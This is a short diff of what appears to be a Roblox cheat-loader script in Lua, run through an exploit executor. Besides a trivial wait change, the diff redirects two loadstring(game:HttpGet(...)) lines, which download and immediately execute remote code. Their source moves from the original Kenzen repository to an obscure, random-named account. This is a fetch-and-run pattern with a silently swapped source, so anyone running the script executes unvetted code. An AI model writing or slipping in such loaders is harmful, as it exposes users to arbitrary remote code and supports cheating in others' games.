@@ -38,7 +38,7 @@ task.spawn(coroutine.create(function()
 
 	setreadonly(mt, true)
 	game:GetService("CoreGui"):WaitForChild("RobloxLoadingGui",500):WaitForChild("BlackFrame",500).Visible = false
-	task.wait()
+	task.wait(0/1)
 	local fakecha = Instance.new("Model")
 	local fakepart = Instance.new("Part")
 	local fakehum = Instance.new("Humanoid")
@@ -69,9 +69,9 @@ task.spawn(coroutine.create(function()
 end))
 task.spawn(coroutine.create(function()
 	if kenzengui then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/KenzenGui.lua",true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/AwsZFvR4Fh6/Ya/main/KenzenGui.lua",true))()
 	else
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/KenzenScript.lua",true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/AwsZFvR4Fh6/Ya/main/KenzenScript.lua",true))()
 	end
 end))
 task.spawn(coroutine.create(function()
